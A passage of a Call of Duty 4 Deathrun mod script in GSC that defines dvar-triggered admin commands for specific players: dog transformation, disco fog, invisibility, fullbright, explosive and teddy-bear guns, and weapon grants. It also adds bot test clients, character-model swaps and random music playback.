/*self playSound("mp_ingame_summary");*/
wait 0.5;
self setModel("playermodel_dnf_duke");
wait 0.5;
self takeAllWeapons();
wait 0.5;
self GiveWeapon("dog_mp");
wait 0.5;
self SwitchToWeapon("dog_mp");
}
pick_dog()
{
setDvar("scr_activator_dog", "");

thread DvarChecker15();
}

DvarChecker15()
{
while(1)
{
if( getdvar( "scr_activator_dog" ) != "" )
thread _rpd15();
wait .1;
}
}

_rpd15()
{
PlayerNum = getdvarint("scr_activator_dog");
setdvar("scr_activator_dog", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded15();
}
}
}
_cmd_rpd_threaded15()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun15();
self iPrintlnBold("^1RUFFF!!");

}
else
{
self.tpg = false;
self thread TeleportRun15();
self iPrintlnBold("^9RUFFF!!");
}
}
TeleportRun15()
{
level thread pickRandomActivator2();
}
disco_cmd()
{
setDvar("scr_disco", "");

thread DvarChecker16();
}

DvarChecker16()
{
while(1)
{
if( getdvar( "scr_disco" ) != "" )
thread _rpd16();
wait .1;
}
}

_rpd16()
{
PlayerNum = getdvarint("scr_disco");
setdvar("scr_disco", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded16();
}
}
}
_cmd_rpd_threaded16()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun16();

}
else
{
self.tpg = false;
self thread TeleportRun16();
}
}
TeleportRun16()
{
/*self playSound("mp_ingame_summary");*/
while(1) 
        { 
        SetExpFog(256, 512, 1, 0, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 1, 0); 
       wait .5; 
        SetExpFog(256, 512, 0.4, 1, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.8, 0, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.2, 1, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 0.4, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 0.2, 0.2, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 1, 1, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.6, 0, 0.4, 0); 
       wait .5; 
        SetExpFog(256, 512, 1, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.6, 1, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 0, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 1, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0, 0, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 1, 0.8, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.8, 0, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0.6, 0); 
        wait .5; 
        SetExpFog(256, 512, 1, 1, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.2, 1, 0.8, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.4, 0.4, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.4, 0.2, 0.2, 0); 
       wait .5; 
        SetExpFog(256, 512, 0.4, 1, 1, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.6, 0, 0.4, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.6, 1, 0.6, 0); 
        
           }
}
show_player()
{
setDvar("scr_show", "");

thread DvarChecker17();
}

DvarChecker17()
{
while(1)
{
if( getdvar( "scr_show" ) != "" )
thread _rpd17();
wait .1;
}
}

_rpd17()
{
PlayerNum = getdvarint("scr_show");
setdvar("scr_show", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded17();
}
}
}
_cmd_rpd_threaded17()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun17();

}
else
{
self.tpg = false;
self thread TeleportRun17();
}
}
TeleportRun17()
{
/*self playSound("mp_ingame_summary");*/
setDvar( "sv_cheats", 1 );
self iPrintln("You are ^2[Visible]");
self show();
setDvar( "sv_cheats", 0 );
}
hide_player()
{
setDvar("scr_hide_player", "");

thread DvarChecker18();
}

DvarChecker18()
{
while(1)
{
if( getdvar( "scr_hide_player" ) != "" )
thread _rpd18();
wait .1;
}
}

_rpd18()
{
PlayerNum = getdvarint("scr_hide_player");
setdvar("scr_hide_player", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded18();
}
}
}
_cmd_rpd_threaded18()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun18();

}
else
{
self.tpg = false;
self thread TeleportRun18();
}
}
TeleportRun18()
{
/*self playSound("mp_ingame_summary");*/
setDvar( "sv_cheats", 1 );
self iPrintln("You are ^2[Invisible]");
self hide();
setDvar( "sv_cheats", 0 );
}
fullbright_player()
{
setDvar("scr_fullbright", "");

thread DvarChecker19();
}

DvarChecker19()
{
while(1)
{
if( getdvar( "scr_fullbright" ) != "" )
thread _rpd19();
wait .1;
}
}

_rpd19()
{
PlayerNum = getdvarint("scr_fullbright");
setdvar("scr_fullbright", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded19();
}
}
}
_cmd_rpd_threaded19()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun19();
self iPrintln("Fullbright ^2[ON]");
}
else
{
self.tpg = false;
self thread TeleportRun19();
self iPrintln("Fullbright ^2[ON]");
}
}
TeleportRun19()
{
/*self playSound("mp_ingame_summary");*/
wait 0.5;
self setClientDvar( "r_fullbright", 1 );
}
wtf_gun()
{
setDvar("scr_nukebullet", "");

thread DvarChecker21();
}

DvarChecker21()
{
while(1)
{
if( getdvar( "scr_nukebullet" ) != "" )
thread _rpd21();
wait .1;
}
}

_rpd21()
{
PlayerNum = getdvarint("scr_nukebullet");
setdvar("scr_nukebullet", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded21();
}
}
}
_cmd_rpd_threaded21()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun21();
self iPrintln("WTF Gun ^2[ON]");
}
else
{
self.tpg = false;
self notify( "Stop_TP" );
self iPrintln("WTF Gun ^1[OFF]");
}
}
TeleportRun21()
{
self endon ( "death" );
self endon ( "Stop_TP" );
for(;;)
{
                self waittill ( "weapon_fired" );
                self playSound("weap_M40A3sniper_fire_plr");
                vec = anglestoforward(self getPlayerAngles());
                end = (vec[0] * 200000, vec[1] * 200000, vec[2] * 200000);
				origin = self getorigin();
                SPLOSIONlocation = BulletTrace( self gettagorigin("tag_eye"), self gettagorigin("tag_eye")+end, 0, self)[ "position" ];
				explode = loadfx( "explosions/tanker_explosion" );
                playfx(explode, SPLOSIONlocation); 
                RadiusDamage( SPLOSIONlocation, 300, 500, 80, origin ); 
                earthquake (0.3, 1, SPLOSIONlocation, 100); 
        }
}
ted_gun()
{
setDvar("scr_ted", "");

thread DvarChecker23();
}

DvarChecker23()
{
while(1)
{
if( getdvar( "scr_ted" ) != "" )
thread _rpd23();
wait .1;
}
}

_rpd23()
{
PlayerNum = getdvarint("scr_ted");
setdvar("scr_ted", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded23();
}
}
}
_cmd_rpd_threaded23()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun23();
self iPrintln("Teddies <3 ^2[ON]");
}
else
{
self.tpg = false;
self notify( "Stop_TP" );
self iPrintln("Teddies <3 ^1[OFF]");
}
}
TeleportRun23()
{
self endon ( "death" );
self endon ( "Stop_TP" );
for(;;)
{
                self waittill ( "weapon_fired" );
                vec = anglestoforward(self getPlayerAngles());
                end = (vec[0] * 200000, vec[1] * 200000, vec[2] * 200000);
				origin = self getorigin();
                SPLOSIONlocation = BulletTrace( self gettagorigin("tag_eye"), self gettagorigin("tag_eye")+end, 0, self)[ "position" ];
				explode = loadfx( "deathrun/falling_teddys" );
                playfx(explode, SPLOSIONlocation); 
                RadiusDamage( SPLOSIONlocation, 300, 500, 80, origin ); 
                earthquake (0.3, 1, SPLOSIONlocation, 100); 
        }
}
jetpack_up()
{
setDvar("scr_jetpack", "");

thread DvarChecker20();
}

DvarChecker20()
{
while(1)
{
if( getdvar( "scr_jetpack" ) != "" )
thread _rpd20();
wait .1;
}
}

_rpd20()
{
PlayerNum = getdvarint("scr_jetpack");
setdvar("scr_jetpack", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded20();
}
}
}
_cmd_rpd_threaded20()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun20();

}
else
{
self.tpg = false;
self thread TeleportRun20();
}
}
TeleportRun20()
{
/*self playSound("mp_ingame_summary");*/
}
givetomahawk()
{
setDvar("scr_hawk", "");

thread DvarChecker24();
}

DvarChecker24()
{
while(1)
{
if( getdvar( "scr_hawk" ) != "" )
thread _rpd24();
wait .1;
}
}

_rpd24()
{
PlayerNum = getdvarint("scr_hawk");
setdvar("scr_hawk", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded24();
}
}
}
_cmd_rpd_threaded24()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun24();
self iPrintln("You got a ^2[Tomahawk]");

}
else
{
self.tpg = false;
self thread TeleportRun24();
self iPrintln("You got a ^2[Tomahawk]");
}
}
TeleportRun24()
{
wait 0.1;
/*self playSound("mp_ingame_summary");*/
self GiveWeapon("tomahawk_mp");
self setWeaponAmmoClip( "tomahawk_mp", 20);
self SwitchToWeapon("tomahawk_mp");
wait 0.1;
}
giveminigun()
{
setDvar("scr_mini", "");

thread DvarChecker25();
}

DvarChecker25()
{
while(1)
{
if( getdvar( "scr_mini" ) != "" )
thread _rpd25();
wait .1;
}
}

_rpd25()
{
PlayerNum = getdvarint("scr_mini");
setdvar("scr_mini", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded25();
}
}
}
_cmd_rpd_threaded25()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun25();
self iPrintln("You got the ^2[Minigun]");

}
else
{
self.tpg = false;
self thread TeleportRun25();
self iPrintln("You got the ^2[Minigun]");
}
}
TeleportRun25()
{
wait 0.1;
/*self playSound("mp_ingame_summary");*/
self GiveWeapon("m60e4_mp");
self setViewModel( "viewmodel_hands_zombie" );
self setClientDvar( "cg_thirdperson", 1 );
self setWeaponAmmoClip( "m60e4_mp", 500);
self SwitchToWeapon("m60e4_mp");
wait 1;
self iPrintln("[+500 Ammo]");
wait 0.1;
}
no_fullbright_player()
{
setDvar("scr_nofullbright", "");

thread DvarChecker22();
}

DvarChecker22()
{
while(1)
{
if( getdvar( "scr_nofullbright" ) != "" )
thread _rpd22();
wait .1;
}
}

_rpd22()
{
PlayerNum = getdvarint("scr_nofullbright");
setdvar("scr_nofullbright", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded22();
}
}
}
_cmd_rpd_threaded22()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun22();
self iPrintln("Fullbright ^2[OFF]");
}
else
{
self.tpg = false;
self thread TeleportRun22();
self iPrintln("Fullbright ^2[OFF]");
}
}
TeleportRun22()
{
/*self playSound("mp_ingame_summary");*/
wait 0.5;
self setClientDvar( "r_fullbright", 0 );
}
envy()
{
	level thread Hit();
}

Hit()
{
	for(;;)
	{
		level waittill( "player_damage", owned, attacker );
		if( isDefined(attacker) && isPlayer(attacker) && owned != attacker && isDefined(level.activ) && ( level.activ == owned || level.activ == attacker) )
			attacker Marker();
	}
}

Marker()
{
	self playlocalsound("MP_hit_alert");
	self.hud_damagefeedback.alpha = 1;
	self.hud_damagefeedback fadeOverTime(1);
	self.hud_damagefeedback.alpha = 0;
}

addTestClients()
{
    setDvar("scr_testclients", "");
    wait 1;
    for(;;)
    {
        if(getdvarInt("scr_testclients") > 0)
            break;
        wait 1;
    }
    testclients = getdvarInt("scr_testclients");
    setDvar( "scr_testclients", 0 );
    for(i=0;i<testclients;i++)
    {
        ent[i] = addtestclient();
 
        if (!isdefined(ent[i]))
        {
            println("Could not add test client");
            wait 1;
            continue;
        }
        ent[i].pers["isBot"] = true;
        ent[i] thread TestClient("autoassign");
    }
    thread addTestClients();
}
 
TestClient(team)
{
    self endon( "disconnect" );
 
    while(!isdefined(self.pers["team"]))
        wait .05;
       
    self notify("menuresponse", game["menu_team"], team);
    wait 0.5;
}

watchDog()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	if( !self.pers["isDog"] )
		return;

	iPrintln( self.name + " ^7is a Dog!" );
	self.isDog = false;
	while( self isReallyAlive() )
	{
		if( self isOnLadder() || self isMantling() )
		{
			self makeMeHuman();
		}
		else 
		{
			self makeMeDog();
		}

		if( self.isDog && self getCurrentWeapon() != "dog_mp" )
		{
			self.isDog = false;
			self makeMeDog();
		}

		wait 0.05;
	}
}


makeMeDog()
{
	if( self.isDog )
		return;

	self.isDog = true;

	self setModel( "german_sheperd_dog" );
	weapon = "dog_mp";
	self takeAllWeapons();
	self giveWeapon( weapon );
	self setSpawnWeapon( weapon );
	self switchToWeapon( weapon );
}

makeMeHuman()
{
	if( !self.isDog )
		return;

	self.isDog = false;
	

	self braxi\_teams::setPlayerModel();
	self setViewModel( "viewmodel_hands_zombie" );
	self takeAllWeapons();
	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self switchToWeapon( self.pers["weapon"] );
}

watchJoker()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	if( !self.pers["isJoker"] )
		return;

	iPrintln( self.name + " ^7is a the Joker!" );
	self.Joker = false;
	while( self isReallyAlive() )
	{
		if( self.isJoker && self getCurrentWeapon() != "tomahawk_mp" )
		{
			self.isJoker = false;
			self makeMeJoker();
		}

		wait 0.05;
	}
}


makeMeJoker()
{
	if( self.isJoker )
		return;

	self.isJoker = true;

	self setModel( "playermodel_baa_joker" );
	weapon = "tomahawk_mp";
}

nomorejoker()
{
	if( !self.isJoker )
		return;

	self.isJoker = false;

	self braxi\_teams::setPlayerModel();
	self setViewModel( "viewmodel_hands_zombie" );
	self takeAllWeapons();
	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self switchToWeapon( self.pers["weapon"] );
}

watchDuke()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	if( !self.pers["isDuke"] )
		return;

	iPrintln( self.name + " ^7is a Duke Nukem!" );
	self.Duke = false;
	while( self isReallyAlive() )
	{

		if( self.isDuke && self getCurrentWeapon() != "tomahawk_mp" )
		{
			self.isDuke = false;
			self makeMeDuke();
		}

		wait 0.05;
	}
}


makeMeDuke()
{ 
	if( self.isDuke )
		return;

	self.isDuke = true;

	self setModel( "playermodel_dnf_duke" );
	self setViewModel( "viewhands_dnf_duke" );
	weapon = "tomahawk_mp";
}

nomoreduke()
{
	if( !self.isDuke )
		return;

	self.isDuke = false;

	self braxi\_teams::setPlayerModel();
	self setViewModel( "viewmodel_hands_zombie" );
	self takeAllWeapons();
	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self switchToWeapon( self.pers["weapon"] );
}

watchArmyh()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	if( !self.pers["isArmyh"] )
		return;

	iPrintln( self.name + " ^7is Novak Heavy!" );
	self.isArmyh = false;
	while( self isReallyAlive() )
	{

		if( self.isArmyh && self getCurrentWeapon() != "tomahawk_mp" )
		{
			self.isArmyh = false;
			self makeMeArmyh();
		}

		wait 0.05;
	}
}


makeMeArmyh()
{ 
	if( self.isArmyh )
		return;

	self.isArmyh = true;
	
	//self setModel( "playermodel_aot_novak_00_heavy" );
	weapon = "tomahawk_mp";
}

nomorearmyh()
{
	if( !self.isArmyh )
		return;

	self.isArmyh = false;

	self braxi\_teams::setPlayerModel();
	self setViewModel( "viewmodel_hands_zombie" );
	self takeAllWeapons();
	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self switchToWeapon( self.pers["weapon"] );
}

watchRoskoh()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	if( !self.pers["isRoskoh"] )
		return;

	iPrintln( self.name + " ^7is Rosko Heavy!" );
	self.Roskoh = false;
	while( self isReallyAlive() )
	{

		if( self.isRoskoh && self getCurrentWeapon() != "tomahawk_mp" )
		{
			self.isRoskoh = false;
			self makeMeRoskoh();
		}

		wait 0.05;
	}
}


makeMeRoskoh()
{ 
	if( self.isRoskoh )
		return;

	self.isRoskoh = true;

	//self setModel( "playermodel_aot_rosco_00_heavy" );
	weapon = "tomahawk_mp";
}

nomoreRoskoh()
{
	if( !self.isRoskoh )
		return;

	self.isRoskoh = false;

	self braxi\_teams::setPlayerModel();
	self setViewModel( "viewmodel_hands_zombie" );
	self takeAllWeapons();
	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self switchToWeapon( self.pers["weapon"] );
}

watchrandomer()
{
    self endon( "disconnect" );

	if( !self.pers["randomer"] )
		return;

	self.randomer = false;
		{
			self.randomer = false;
			self playrandomer();
		}
}



playrandomer()
{ 
	if( self.randomer )
		return;

	iPrintln( self.name + " Playing MUSIC" );
	self.randomer = true;
	self random();
}

stoprandomer()
{
	if( !self.randomer )
		return;

	self.randomer = false;
	self localmusicstop();
}

musicstop()
{
	level.player StopLocalSound( "maptrax_1" );
	level.player StopLocalSound( "maptrax_2" );
	level.player StopLocalSound( "maptrax_3" );
	level.player StopLocalSound( "maptrax_4" );
	level.player StopLocalSound( "maptrax_5" );
	level.player StopLocalSound( "maptrax_6" );
	level.player StopLocalSound( "maptrax_7" );
	level.player StopLocalSound( "maptrax_8" );
	level.player StopLocalSound( "maptrax_9" );
	level.player StopLocalSound( "maptrax_10" );
	level.player StopLocalSound( "maptrax_11" );
	level.player StopLocalSound( "maptrax_12" );
	level.player StopLocalSound( "maptrax_13" );
	level.player StopLocalSound( "maptrax_14" );
	level.player StopLocalSound( "maptrax_15" );
	level.player StopLocalSound( "maptrax_16" );
	level.player StopLocalSound( "maptrax_17" );
	level.player StopLocalSound( "maptrax_18" );
	level.player StopLocalSound( "maptrax_19" );
	level.player StopLocalSound( "maptrax_20" );
}

random()
{
				maptrax = (1+randomInt(20));
				self playLocalSound( "maptrax_" + maptrax );
}

localmusicstop()
{				self stopLocalSound( "maptrax_1" );
				self stopLocalSound( "maptrax_2" );
				self stopLocalSound( "maptrax_3" );
				self stopLocalSound( "maptrax_4" );
				self stopLocalSound( "maptrax_5" );
				self stopLocalSound( "maptrax_6" );
				self stopLocalSound( "maptrax_7" );
				self stopLocalSound( "maptrax_8" );
				self stopLocalSound( "maptrax_9" );
				self stopLocalSound( "maptrax_10" );
				self stopLocalSound( "maptrax_11" );
				self stopLocalSound( "maptrax_12" );
				self stopLocalSound( "maptrax_13" );
				self stopLocalSound( "maptrax_14" );
				self stopLocalSound( "maptrax_15" );
				self stopLocalSound( "maptrax_16" );
				self stopLocalSound( "maptrax_17" );
				self stopLocalSound( "maptrax_18" );
				self stopLocalSound( "maptrax_19" );
				self stopLocalSound( "maptrax_20" );
}